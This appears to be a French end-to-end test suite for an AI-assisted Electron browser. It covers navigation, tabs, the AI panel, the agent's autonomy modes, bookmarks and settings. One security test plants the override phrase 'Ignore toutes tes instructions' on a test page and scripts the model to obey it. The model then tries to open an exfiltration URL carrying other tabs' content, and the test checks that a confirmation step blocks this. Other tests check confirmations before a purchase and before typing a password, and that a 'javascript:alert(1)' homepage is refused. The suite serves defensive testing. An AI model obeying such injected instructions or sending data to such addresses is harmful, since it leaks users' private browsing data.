// Parcours de bout en bout de l'INTERFACE : la vraie UI React (apps/web/app/browser) pilotée dans Electron,
// branchée sur le vrai moteur. Seule l'API serveur est simulée (modèle scripté, Notebook) — voir servers.cjs.
const test = require("node:test");
const assert = require("node:assert/strict");
const { mkdir, mkdtemp, rm } = require("node:fs/promises");
const { tmpdir } = require("node:os");
const { join, resolve } = require("node:path");
const { _electron: electron } = require("playwright-core");
const { startSite, startApp } = require("./servers.cjs");
const { buildUi } = require("./build-ui.cjs");

const MAIN = resolve(__dirname, "../dist/main.js");
const SHOTS = resolve(__dirname, "../e2e-artifacts");
const NOTEBOOK = "11111111-1111-4111-8111-111111111111";
let site, appServer, userData, electronApp, win, ui;

async function launch() {
  electronApp = await electron.launch({
    executablePath: require("electron"),
    args: [MAIN, `--user-data-dir=${userData}`],
    env: { ...process.env, LEANNA_WEB_URL: appServer.url },
  });
  win = await electronApp.firstWindow();
  await win.waitForSelector("[data-browser-ready=true]", { timeout: 20_000 });
}

const state = () => win.evaluate(() => window.leannaDesktop.browser.getState());
async function waitFor(predicate, message, timeout = 15_000) {
  const start = Date.now();
  for (;;) {
    const value = await predicate();
    if (value) return value;
    if (Date.now() - start > timeout) assert.fail(`délai dépassé : ${message}`);
    await new Promise((done) => setTimeout(done, 100));
  }
}
const activeTab = async () => { const s = await state(); return s.tabs.find((tab) => tab.id === s.activeTabId); };
const activeLoaded = (fragment) => waitFor(async () => {
  const tab = await activeTab();
  return tab && tab.url.includes(fragment) && !tab.loading ? tab : null;
}, `onglet actif sur ${fragment}`);
/** Capture de toute la fenêtre, vue native comprise (ce que voit réellement l'utilisateur). */
async function shot(name) {
  await mkdir(SHOTS, { recursive: true });
  const png = await electronApp.evaluate(async ({ BrowserWindow }) =>
    (await BrowserWindow.getAllWindows()[0].capturePage()).toPNG().toString("base64"));
  await require("node:fs/promises").writeFile(join(SHOTS, `${name}.png`), Buffer.from(png, "base64"));
  // capturePage() de la fenêtre n'inclut pas la vue native : on capture aussi le contenu de l'onglet actif.
  const view = await electronApp.evaluate(async ({ BrowserWindow }) => {
    const views = BrowserWindow.getAllWindows()[0].contentView.children;
    const last = views[views.length - 1];
    return last?.webContents ? (await last.webContents.capturePage()).toPNG().toString("base64") : null;
  });
  if (view) await require("node:fs/promises").writeFile(join(SHOTS, `${name}-page.png`), Buffer.from(view, "base64"));
}
/** Rend le focus clavier à l'interface (un clic réel le fait ; Playwright, lui, n'envoie pas d'événement OS). */
const focusUi = () => electronApp.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].webContents.focus());
async function go(address, fragment = address) {
  await focusUi();
  const input = win.getByLabel("Adresse web ou recherche");
  await input.fill(address);
  await input.press("Enter");
  return activeLoaded(fragment);
}

test.before(async () => {
  site = await startSite();
  ui = await buildUi({ notebookId: NOTEBOOK });
  appServer = await startApp(ui);
  userData = await mkdtemp(join(tmpdir(), "leanna-ui-e2e-"));
  // Page d'accueil locale : le parcours ne dépend d'aucun site externe.
  await require("node:fs/promises").writeFile(join(userData, "browser-data.json"),
    JSON.stringify({ version: 2, settings: { homepage: `${site.url}/vide` } }));
  await launch();
  await activeLoaded("/vide");
});

test.after(async () => {
  await electronApp?.close().catch(() => undefined);
  await site?.close();
  await appServer?.close();
  await rm(userData, { recursive: true, force: true }).catch(() => undefined);
  await rm(ui.dir, { recursive: true, force: true }).catch(() => undefined);
});

test("interface : barre d'adresse, indicateur de sécurité, navigation et vue native alignée", async () => {
  const tab = await go(`${site.url}/article`, "/article");
  assert.equal(tab.title, "Les marées expliquées");
  assert.equal(await win.getByLabel("Adresse web ou recherche").inputValue(), `${site.url}/article`);
  assert.equal(await win.locator("[data-security]").getAttribute("data-security"), "insecure");
  assert.equal(await win.getByRole("tab", { selected: true }).innerText(), "Les marées expliquées");

  // La vue Chromium native occupe exactement la zone réservée par l'interface.
  const zone = await win.locator("[data-browser-viewport]").boundingBox();
  const view = await electronApp.evaluate(({ BrowserWindow }) => {
    const views = BrowserWindow.getAllWindows()[0].contentView.children;
    return views[views.length - 1].getBounds();
  });
  for (const key of ["x", "y", "width", "height"]) assert.ok(Math.abs(view[key] - zone[key]) <= 1, `${key}: vue ${view[key]} / zone ${zone[key]}`);
  await shot("01-navigation");

  await win.getByLabel("Page précédente").click();
  await activeLoaded("/vide");
  await win.getByLabel("Page suivante").click();
  await activeLoaded("/article");
});

test("interface : recherche depuis la barre d'adresse avec le moteur configuré", async () => {
  await win.evaluate(() => window.leannaDesktop.browser.updateSettings({ searchEngine: "duckduckgo" }));
  const input = win.getByLabel("Adresse web ou recherche");
  await input.fill("marées bretagne");
  await input.press("Enter");
  const tab = await waitFor(async () => { const t = await activeTab(); return t.url.includes("duckduckgo.com") ? t : null; }, "recherche lancée");
  assert.match(tab.url, /duckduckgo\.com\/\?q=mar%C3%A9es(%20|\+)bretagne/);
  // Laisse le moteur de recherche finir sa propre redirection avant de naviguer ailleurs.
  await waitFor(async () => !(await activeTab()).loading, "fin du chargement de la recherche", 30_000);
  await go(`${site.url}/article`, "/article");
});

test("interface : onglets (nouveau, bascule, duplication, fermeture) et raccourcis clavier", async () => {
  await win.getByLabel("Nouvel onglet", { exact: true }).click();
  await waitFor(async () => (await state()).tabs.length === 2, "nouvel onglet");
  // L'interface doit avoir reçu le nouvel état avant qu'on tape dans la barre d'adresse.
  await waitFor(async () => (await win.getByRole("tab").count()) === 2, "onglet affiché");
  await activeLoaded("/vide");
  await go(`${site.url}/produit-a`, "/produit-a");
  assert.equal(await win.getByRole("tab").count(), 2);

  await win.getByRole("tab", { name: /marées/i }).click();
  await activeLoaded("/article");

  await win.getByLabel(/^Dupliquer l’onglet Les marées/).click({ force: true });
  await waitFor(async () => (await state()).tabs.filter((t) => t.url.includes("/article")).length === 2, "onglet dupliqué");

  // Raccourcis depuis l'interface : Ctrl+W ferme l'onglet (et non la fenêtre), Ctrl+L sélectionne l'adresse.
  await focusUi();
  await win.getByRole("tab", { selected: true }).focus();
  await win.keyboard.press("Control+w");
  await waitFor(async () => (await state()).tabs.length === 2, "Ctrl+W ferme l'onglet actif");
  assert.equal(await electronApp.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length), 1);
  await win.keyboard.press("Control+l");
  await waitFor(() => win.evaluate(() => document.activeElement?.getAttribute("aria-label") === "Adresse web ou recherche"), "Ctrl+L");
  await win.keyboard.press("Control+Tab");
  const before = (await state()).activeTabId;
  await win.keyboard.press("Control+Tab");
  await waitFor(async () => (await state()).activeTabId !== before, "Ctrl+Tab change d'onglet");
  await shot("02-onglets");
});

// ── Panneau IA et agent (modèle scripté côté serveur de test) ───────────────
const say = (text) => [["meta", { step: 0 }], ["delta", { text }], ["done", { text, continuation: "jeton-de-test" }]];
const callTool = (name, args, text = "") => [
  ...(text ? [["delta", { text }]] : []),
  ["tool_calls", { calls: [{ id: `c${Math.random().toString(36).slice(2, 8)}`, name, arguments: JSON.stringify(args) }] }],
  ["done", { continuation: "jeton-de-test" }],
];
async function ask(text) {
  await focusUi();
  const box = win.getByLabel("Message à Leanna");
  await box.fill(text);
  await box.press("Enter");
}
const setMode = (mode) => win.locator(`[data-mode="${mode}"]`).click();
const lastRequest = () => appServer.model.requests[appServer.model.requests.length - 1];
const journal = (status) => win.locator(`[data-journal="${status}"]`);
async function freshConversation() {
  const button = win.getByLabel("Nouvelle conversation");
  if (await button.isEnabled()) await button.click();
  appServer.model.script.length = 0;
}

test("panneau IA : résumé de la page active avec contexte borné et source citée par URL", async () => {
  await go(`${site.url}/article`, "/article");
  appServer.model.script.push(() => say(`Les marées sont causées par la Lune et, pour 46 %, par le Soleil.\n\nSources : ${site.url}/article`));
  await win.getByRole("button", { name: "Résume cette page" }).click();
  await win.locator('[data-message="assistant"]').getByText(/causées par la Lune/).waitFor();

  const request = lastRequest();
  assert.equal(request.persona, "leanna");
  assert.equal(request.messages.length, 1);
  const { page } = request.messages[0];
  assert.equal(page.url, `${site.url}/article`);
  assert.match(page.text, /attraction gravitationnelle de la Lune/);
  assert.doesNotMatch(JSON.stringify(request), /<article|<html|Publicité/, "ni DOM ni bruit de page dans la requête");
  assert.ok(page.text.length <= 30_000);

  // La source citée est cliquable et s'ouvre dans un onglet du navigateur.
  const tabsBefore = (await state()).tabs.length;
  await win.getByLabel("Sources citées").getByRole("button").first().click();
  await waitFor(async () => (await state()).tabs.length === tabsBefore + 1, "source ouverte dans un nouvel onglet");
  await shot("04-resume");
  await win.keyboard.press("Control+w").catch(() => undefined);
});

test("panneau IA : question sur une page inaccessible — le contexte dit qu'elle est indisponible", async () => {
  await freshConversation();
  await focusUi();
  const input = win.getByLabel("Adresse web ou recherche");
  await input.fill("http://127.0.0.1:9/");
  await input.press("Enter");
  await win.getByText("Impossible d’afficher cette page").waitFor();
  appServer.model.script.push(() => say("Je ne peux pas lire cette page : elle est inaccessible."));
  await ask("Que dit cette page ?");
  await win.locator('[data-message="assistant"]').getByText(/inaccessible/).waitFor();
  const { page } = lastRequest().messages[0];
  assert.deepEqual([page.status, page.reason, page.text], ["unavailable", "page_load_failed", ""]);
  await go(`${site.url}/article`, "/article");
});

test("agent, mode assistance : l'action attend l'accord de l'utilisateur, puis s'exécute et est journalisée", async () => {
  await freshConversation();
  await setMode("assistance");
  const target = `${site.url}/produit-b`;
  appServer.model.script.push(
    () => callTool("browser_open_url", { url: target }, "Je vais ouvrir la fiche du Boréal 15."),
    () => callTool("browser_get_page_content", {}),
    () => say(`Le Boréal 15 coûte 1299 euros.\n\nSources : ${target}`),
  );
  const hitsBefore = site.hits["/produit-b"] ?? 0;
  await ask(`Ouvre ${target} et donne-moi le prix`);
  await journal("pending").waitFor();
  assert.match(await journal("pending").innerText(), /Ouvrir .*produit-b/);
  assert.equal(site.hits["/produit-b"] ?? 0, hitsBefore, "aucune navigation avant l'accord");
  await shot("05-confirmation");

  await journal("pending").getByRole("button", { name: "Autoriser" }).click();
  await win.locator('[data-message="assistant"]').getByText(/1299 euros/).waitFor();
  assert.equal((await activeTab()).url, target);
  assert.equal(await journal("done").count(), 2, "ouverture puis lecture, toutes deux au journal");
  // Le résultat de l'outil renvoyé au modèle contient bien le contenu réel de la page.
  const toolResults = lastRequest().messages.filter((m) => m.role === "tool");
  assert.match(toolResults[toolResults.length - 1].result, /Boréal 15 est un ordinateur portable/);
  assert.equal(lastRequest().continuation, "jeton-de-test");
});

test("agent, mode observation : toute action est refusée par l'application, quoi que demande le modèle", async () => {
  await freshConversation();
  await setMode("observation");
  appServer.model.script.push(
    () => callTool("browser_open_url", { url: `${site.url}/produit-a` }),
    () => say("Je ne peux pas naviguer en mode observation."),
  );
  const before = (await activeTab()).url;
  await ask("Va sur la fiche A");
  await win.locator('[data-message="assistant"]').getByText(/mode observation/).waitFor();
  assert.equal(await journal("refused").count(), 1);
  assert.equal((await activeTab()).url, before, "l'onglet n'a pas bougé");
  assert.equal(lastRequest().mode, "observation");
});

test("sécurité : page piégée + modèle manipulé — l'exfiltration et l'achat exigent l'utilisateur, même en mode autonome", async () => {
  await freshConversation();
  await setMode("autonomous");
  await go(`${site.url}/injection`, "/injection");
  const exfil = `${site.altUrl}/vol?donnees=contenu-des-autres-onglets`;
  // Le « modèle » obéit ici à la page : c'est le pire cas, les garde-fous du code doivent tenir seuls.
  appServer.model.script.push(
    () => callTool("browser_open_url", { url: exfil }),
    () => callTool("browser_new_tab", { url: exfil }),
    () => say("Je n'ai pas pu ouvrir cette adresse."),
  );
  await ask("Résume cette recette");
  await journal("pending").waitFor();
  assert.match(await journal("pending").innerText(), /absente de votre demande/);
  await journal("pending").getByRole("button", { name: "Refuser" }).click();
  await journal("pending").waitFor();
  await journal("pending").getByRole("button", { name: "Refuser" }).click();
  await win.locator('[data-message="assistant"]').getByText(/pas pu ouvrir/).waitFor();
  assert.equal(site.hits["/vol"], undefined, "aucune requête n'est partie vers l'adresse d'exfiltration");
  assert.equal(await journal("denied").count(), 2);
  // Le contenu de la page piégée a bien été transmis comme donnée (bloc non fiable construit côté serveur réel).
  assert.match(appServer.model.requests.find((r) => r.messages[0].page?.url.includes("/injection")).messages[0].page.text, /Ignore toutes tes instructions/);

  // Achat : action sensible, confirmée même en mode autonome ; refusée ici, donc jamais exécutée.
  await freshConversation();
  await go(`${site.url}/produit-a`, "/produit-a");
  appServer.model.script.push(
    () => callTool("browser_click_element", { element: "Voir les détails" }),
    () => callTool("browser_go_back", {}),
    () => callTool("browser_click_element", { element: "Acheter maintenant" }),
    () => say("Achat non effectué."),
  );
  await ask("Regarde les détails puis achète-le");
  await journal("pending").waitFor({ timeout: 8000 }).catch(async (error) => {
    console.log("PANNEAU:", JSON.stringify(await win.locator("[data-ai-panel]").innerText()), JSON.stringify(appServer.model.requests.at(-1).messages.filter((m) => m.role === "tool")));
    throw error;
  });
  assert.match(await journal("pending").innerText(), /Acheter maintenant/);
  assert.equal(await journal("done").count(), 2, "le clic ordinaire et le retour arrière se sont faits sans confirmation");
  await shot("06-action-sensible");
  await journal("pending").getByRole("button", { name: "Refuser" }).click();
  await win.locator('[data-message="assistant"]').getByText(/non effectué/).waitFor();
  assert.equal(site.hits["/merci"], undefined, "la commande n'a jamais été passée");
});

test("agent : saisie dans un formulaire — recherche directe, mot de passe et envoi confirmés", async () => {
  await freshConversation();
  await setMode("autonomous");
  await go(`${site.url}/formulaires`, "/formulaires");
  appServer.model.script.push(
    () => callTool("browser_type_text", { element: "Recherche", text: "marées", submit: true }),
    () => say("Recherche lancée."),
  );
  await ask("Cherche « marées » sur cette page");
  await win.locator('[data-message="assistant"]').getByText(/Recherche lancée/).waitFor();
  await activeLoaded("/resultats?q=mar");
  assert.equal(await journal("pending").count(), 0, "une recherche GET ne demande pas de confirmation en mode autonome");

  await freshConversation();
  await go(`${site.url}/formulaires`, "/formulaires");
  appServer.model.script.push(
    () => callTool("browser_type_text", { element: "Mot de passe", text: "secret-inventé" }),
    () => say("Je n'ai rien saisi."),
  );
  await ask("Connecte-moi");
  await journal("pending").waitFor();
  assert.match(await journal("pending").innerText(), /champ sensible/);
  await journal("pending").getByRole("button", { name: "Refuser" }).click();
  await win.locator('[data-message="assistant"]').getByText(/rien saisi/).waitFor();
  const typed = await electronApp.evaluate(({ webContents }) =>
    webContents.getAllWebContents().find((w) => w.getURL().includes("/formulaires")).executeJavaScript("document.getElementById('pass').value"));
  assert.equal(typed, "", "le champ mot de passe est resté vide");
  assert.equal(site.posts.length, 0, "aucun formulaire n'a été envoyé");
});

test("agent : comparaison de deux pages ouvertes et capture d'écran", async () => {
  await freshConversation();
  await setMode("observation");
  await go(`${site.url}/produit-a`, "/produit-a");
  const b = await win.evaluate((url) => window.leannaDesktop.browser.createTab({ url }), `${site.url}/produit-b`);
  await activeLoaded("/produit-b");
  const a = (await state()).tabs.find((tab) => tab.url.endsWith("/produit-a"));
  appServer.model.script.push(
    () => callTool("browser_compare_pages", { tab_ids: [a.id, b.id] }),
    () => callTool("browser_take_screenshot", {}),
    () => say(`| Modèle | Prix | Autonomie |\n|---|---|---|\n| Aster 14 | 999 € | 12 h |\n| Boréal 15 | 1299 € | 18 h |\n\nSources : ${site.url}/produit-a ${site.url}/produit-b`),
  );
  await ask("Compare ces deux produits");
  await win.locator('[data-message="assistant"]').getByText(/Boréal 15/).first().waitFor();
  const results = lastRequest().messages.filter((m) => m.role === "tool").map((m) => JSON.parse(m.result));
  assert.deepEqual(results[0].pages.map((p) => p.title), ["Aster 14 — fiche produit", "Boréal 15 — fiche produit"]);
  assert.match(results[0].pages[0].text, /999 euros/);
  assert.match(results[0].pages[1].text, /1299 euros/);
  assert.equal(results[1].captured, true);
  assert.ok(await win.getByAltText("Capture de la page").count() >= 1, "la capture est visible dans le journal");
  assert.doesNotMatch(JSON.stringify(results[1]), /base64/, "l'image n'est pas envoyée au modèle");
  await shot("07-comparaison");
  await win.evaluate((id) => window.leannaDesktop.browser.closeTab(id), b.id);
});

test("agent : interruption immédiate d'une mission en cours", async () => {
  await freshConversation();
  await setMode("assistance");
  appServer.model.script.push(
    () => callTool("browser_open_url", { url: `${site.url}/produit-b` }, "J'ouvre la page."),
    () => say("ne doit jamais s'afficher"),
  );
  const hits = site.hits["/produit-b"] ?? 0;
  await ask(`Ouvre ${site.url}/produit-b`);
  await journal("pending").waitFor();
  await win.getByLabel("Interrompre la mission").click();
  await win.getByText("Mission interrompue.").waitFor();
  assert.equal(await journal("pending").count(), 0);
  assert.match(await journal("denied").last().innerText(), /Non exécutée/);
  await new Promise((done) => setTimeout(done, 400));
  assert.equal(site.hits["/produit-b"] ?? 0, hits, "l'action en attente n'a pas été exécutée");
  assert.equal(await win.getByText("ne doit jamais s'afficher").count(), 0);
  assert.equal(await win.getByLabel("Envoyer").count(), 1, "le panneau est de nouveau disponible");
});

test("Notebook : ajout par l'utilisateur — lien, contenu, sélection, contenu + synthèse", async () => {
  await freshConversation();
  await go(`${site.url}/article`, "/article");
  const bar = win.locator("[data-notebook-save]");
  const sources = appServer.notebook.sources;
  const item = () => sources[sources.length - 1].body.items[0];

  await bar.locator('[data-save-mode="link"]').click();
  await bar.getByText("Lien ajouté au Notebook.").waitFor();
  assert.equal(sources[0].notebookId, NOTEBOOK);
  assert.deepEqual([item().type, item().url, item().browser.title, item().browser.mode], ["url", `${site.url}/article`, "Les marées expliquées", "link"]);
  assert.ok(!Number.isNaN(Date.parse(item().browser.consultedAt)), "date de consultation transmise");

  await bar.locator('[data-save-mode="text"]').click();
  await bar.getByText("Contenu ajouté au Notebook.").waitFor();
  assert.equal(item().type, "text");
  assert.equal(item().browser.originUrl, `${site.url}/article`);
  assert.ok(item().text.startsWith(`Source : ${site.url}/article\nPage consultée le `));
  assert.match(item().text, /attraction gravitationnelle de la Lune/);
  assert.doesNotMatch(item().text, /Publicité|<article/);

  await bar.locator('[data-save-mode="selection"]').click();
  await bar.getByText("Sélectionnez d’abord du texte dans la page.").waitFor();
  const count = sources.length;
  await electronApp.evaluate(({ webContents }) => webContents.getAllWebContents().find((w) => w.getURL().includes("/article"))
    .executeJavaScript("const r = document.createRange(); r.selectNodeContents(document.querySelector('h2')); getSelection().removeAllRanges(); getSelection().addRange(r); true"));
  await bar.locator('[data-save-mode="selection"]').click();
  await bar.getByText("Sélection ajoutée au Notebook.").waitFor();
  assert.equal(sources.length, count + 1);
  assert.ok(item().text.endsWith("(extrait sélectionné)\n\nLe rôle de la Lune"));

  appServer.model.script.push(() => say("Idée principale : la Lune provoque les marées.\n- Le Soleil y contribue pour 46 %."));
  await bar.locator('[data-save-mode="summary"]').click();
  await bar.getByText("Contenu et synthèse ajoutés au Notebook.").waitFor();
  const note = appServer.notebook.notes[appServer.notebook.notes.length - 1];
  assert.equal(note.body.title, "Synthèse — Les marées expliquées");
  assert.match(note.body.text, /la Lune provoque les marées[\s\S]*Source : http/);
  assert.equal(item().browser.mode, "summary");
  await shot("08-notebook");
});

test("Notebook : ajout proposé par l'agent — toujours confirmé, résultat réel rapporté au modèle", async () => {
  await freshConversation();
  await setMode("autonomous");
  const before = appServer.notebook.sources.length;
  appServer.model.script.push(() => callTool("browser_save_to_notebook", { mode: "text" }), () => say("Je n'ai rien enregistré."));
  await ask("Garde cette page");
  await journal("pending").waitFor();
  assert.match(await journal("pending").innerText(), /Ajouter « Les marées expliquées » au Notebook \(contenu\)/);
  await journal("pending").getByRole("button", { name: "Refuser" }).click();
  await win.locator('[data-message="assistant"]').getByText(/rien enregistré/).waitFor();
  assert.equal(appServer.notebook.sources.length, before, "refus : rien n'est envoyé au Notebook");

  appServer.model.script.push(() => callTool("browser_save_to_notebook", { mode: "text" }), () => say("C'est enregistré dans votre Notebook."));
  await ask("Finalement, garde-la");
  await journal("pending").getByRole("button", { name: "Autoriser" }).click();
  await win.locator('[data-message="assistant"]').getByText(/C'est enregistré/).waitFor();
  assert.equal(appServer.notebook.sources.length, before + 1);
  const results = lastRequest().messages.filter((m) => m.role === "tool");
  assert.deepEqual(JSON.parse(results[results.length - 1].result), { saved: true, message: "Contenu ajouté au Notebook." });
  await setMode("assistance");
});

test("Roxane : second regard sur la réponse de Leanna, sans outil", async () => {
  await freshConversation();
  await go(`${site.url}/article`, "/article");
  appServer.model.script.push(() => say("Les marées viennent de la Lune."), () => say("Leanna oublie le rôle du Soleil, mentionné dans la page."));
  await ask("Résume en une phrase");
  await win.locator('[data-message="assistant"]').getByText(/viennent de la Lune/).waitFor();
  await win.getByRole("button", { name: "Demander le regard de Roxane" }).click();
  await win.locator('[data-message="roxane"]').getByText(/rôle du Soleil/).waitFor();
  assert.equal(lastRequest().persona, "roxane");
  await setMode("assistance");
});

test("interface : page d'erreur lisible et favoris depuis la barre d'adresse", async () => {
  const input = win.getByLabel("Adresse web ou recherche");
  await input.fill("http://127.0.0.1:9/");
  await input.press("Enter");
  await win.getByText("Impossible d’afficher cette page").waitFor();
  await shot("03-erreur");
  await win.getByRole("button", { name: "Réessayer" }).waitFor();
  await go(`${site.url}/article`, "/article");
  assert.equal(await win.getByText("Impossible d’afficher cette page").count(), 0);

  await win.getByLabel("Ajouter aux favoris").click();
  await win.getByLabel("Retirer des favoris").waitFor();
  const saved = await win.evaluate(() => window.leannaDesktop.browser.getBookmarks());
  assert.equal(saved.bookmarks[0].title, "Les marées expliquées");
});

const openPanel = async (id) => {
  if (await win.locator(`[data-browser-panel="${id}"]`).count() === 0) await win.locator(`[data-panel-toggle="${id}"]`).click();
  await win.locator(`[data-browser-panel="${id}"]`).waitFor();
};
const bookmarksNow = () => win.evaluate(() => window.leannaDesktop.browser.getBookmarks());

test("bibliothèque : favoris — dossier, déplacement, renommage, recherche, suppression", async () => {
  await openPanel("library");
  const panel = win.locator("[data-library-panel]");
  await panel.getByLabel("Nom du nouveau dossier").fill("Science");
  await panel.getByLabel("Créer le dossier").click();
  await panel.locator('[data-folder="Science"]').waitFor();

  await panel.getByLabel("Dossier de Les marées expliquées").selectOption("Science");
  await waitFor(async () => (await bookmarksNow()).bookmarks[0].folder === "Science", "favori déplacé dans le dossier");
  await panel.getByLabel("Renommer Les marées expliquées").click();
  await panel.getByLabel("Nouveau titre du favori").fill("Marées (référence)");
  await panel.getByLabel("Valider le titre").click();
  await waitFor(async () => (await bookmarksNow()).bookmarks[0].title === "Marées (référence)", "favori renommé");

  await panel.getByLabel("Renommer le dossier Science").click();
  await panel.getByLabel("Nouveau nom du dossier").fill("Océans");
  await panel.getByLabel("Valider le nom").click();
  await waitFor(async () => { const b = await bookmarksNow(); return b.folders.includes("Océans") && b.bookmarks[0].folder === "Océans"; }, "dossier renommé");

  await panel.getByLabel("Rechercher dans les favoris").fill("introuvable");
  await panel.getByText("Aucun favori ne correspond.").waitFor();
  await panel.getByLabel("Rechercher dans les favoris").fill("référence");
  await panel.getByText("Marées (référence)").waitFor();
  await shot("09-favoris");
  await panel.getByLabel("Supprimer le favori Marées (référence)").click();
  await waitFor(async () => (await bookmarksNow()).bookmarks.length === 0, "favori supprimé");
});

test("bibliothèque : historique — recherche, suppression ciblée, par période et totale", async () => {
  const panel = win.locator("[data-library-panel]");
  await panel.locator('[data-library-tab="history"]').click();
  const history = () => win.evaluate(() => window.leannaDesktop.browser.getHistory());
  const total = (await history()).length;
  assert.ok(total >= 3, "les pages visitées pendant le parcours sont dans l'historique");

  await panel.getByLabel("Rechercher dans l’historique").fill("Boréal");
  await panel.getByText("Boréal 15 — fiche produit").first().waitFor();
  assert.equal(await panel.getByText("Les marées expliquées").count(), 0);
  await panel.getByLabel("Supprimer Boréal 15 — fiche produit de l’historique").click();
  await waitFor(async () => !(await history()).some((h) => h.title.includes("Boréal")), "entrée supprimée");
  await panel.getByLabel("Rechercher dans l’historique").fill("");

  // Toutes les visites du parcours datent de moins d'une heure : « dernière heure » vide l'historique.
  await panel.getByLabel("Période à effacer").selectOption("hour");
  await panel.getByRole("button", { name: "Effacer" }).click();
  await panel.getByText(/entrées? supprimées?\./).waitFor();
  assert.equal((await history()).length, 0);
  await go(`${site.url}/produit-a`, "/produit-a");
  await waitFor(async () => (await history()).length >= 1, "nouvelle visite enregistrée");
  await panel.getByLabel("Période à effacer").selectOption("all");
  await panel.getByRole("button", { name: "Effacer" }).click();
  await waitFor(async () => (await history()).length === 0, "historique entièrement effacé");
});

test("bibliothèque : téléchargements — liste, état, ouverture du dossier, retrait de l'entrée", async () => {
  const dir = join(userData, "telechargements");
  await mkdir(dir, { recursive: true });
  await electronApp.evaluate(({ dialog, shell }, target) => {
    globalThis.__ui = { shown: [], opened: 0 };
    dialog.showSaveDialogSync = (_w, options) => `${target}\\${options.defaultPath.split(/[\\/]/).pop()}`;
    shell.showItemInFolder = (path) => { globalThis.__ui.shown.push(path); };
    shell.openPath = async () => { globalThis.__ui.opened += 1; return ""; };
  }, dir);
  const panel = win.locator("[data-library-panel]");
  await panel.locator('[data-library-tab="downloads"]').click();
  await panel.getByText(/Aucun téléchargement/).waitFor();

  const tab = await activeTab();
  await win.evaluate(([id, url]) => window.leannaDesktop.browser.navigate(id, url), [tab.id, `${site.url}/notes.txt`]);
  await panel.locator('[data-download="completed"]').waitFor();
  assert.match(await panel.locator('[data-download="completed"]').innerText(), /notes\.txt[\s\S]*Terminé/);
  await shot("10-telechargements");
  await panel.getByLabel("Afficher notes.txt dans son dossier").click();
  await waitFor(() => electronApp.evaluate(() => globalThis.__ui.shown.length === 1), "dossier affiché");
  assert.equal(await electronApp.evaluate(() => globalThis.__ui.opened), 0, "le fichier n'est pas ouvert");
  await panel.getByLabel("Retirer notes.txt de la liste").click();
  await panel.getByText(/Aucun téléchargement/).waitFor();
  assert.ok((await require("node:fs/promises").readFile(join(dir, "notes.txt"), "utf8")).length > 0, "le fichier reste sur le disque");
});

test("réglages : modification depuis l'interface, puis persistance et restauration après redémarrage", async () => {
  await openPanel("settings");
  const panel = win.locator("[data-settings-panel]");
  const settings = () => win.evaluate(() => window.leannaDesktop.browser.getSettings());
  await panel.locator('[data-setting="searchEngine"]').selectOption("qwant");
  await panel.locator('[data-setting="agentMode"]').selectOption("observation");
  await panel.locator('[data-setting="popups"]').click();
  await panel.locator('[data-setting="confirmations"]').click();
  await waitFor(async () => { const s = await settings(); return s.searchEngine === "qwant" && s.agentMode === "observation" && s.popups === "block" && s.confirmations === "every-action"; }, "réglages appliqués");

  await panel.locator('[data-setting="homepage"]').fill("javascript:alert(1)");
  await panel.getByRole("button", { name: "OK", exact: true }).click();
  await panel.getByText(/Adresse refusée/).waitFor();
  assert.equal((await settings()).homepage, `${site.url}/vide`, "une page d'accueil dangereuse est refusée");
  await shot("11-reglages");

  await go(`${site.url}/article`, "/article");
  const expected = (await state()).tabs.map((tab) => tab.url);
  await new Promise((done) => setTimeout(done, 700));
  await electronApp.close();
  await launch();

  const restored = await state();
  assert.deepEqual(restored.tabs.map((tab) => tab.url), expected, "onglets restaurés à l'identique");
  const after = await settings();
  assert.deepEqual([after.searchEngine, after.agentMode, after.popups, after.confirmations, after.aiPanelOpen], ["qwant", "observation", "block", "every-action", false]);
  // Le panneau Leanna était fermé à la sortie : il le reste ; le mode d'autonomie choisi est affiché à sa réouverture.
  assert.equal(await win.locator("[data-ai-panel]").count(), 0);
  await win.locator('[data-panel-toggle="ai"]').click();
  assert.equal(await win.locator('[data-mode="observation"]').getAttribute("aria-checked"), "true");
  await activeLoaded("/article");
  assert.equal(await win.getByLabel("Adresse web ou recherche").inputValue(), `${site.url}/article`);
});
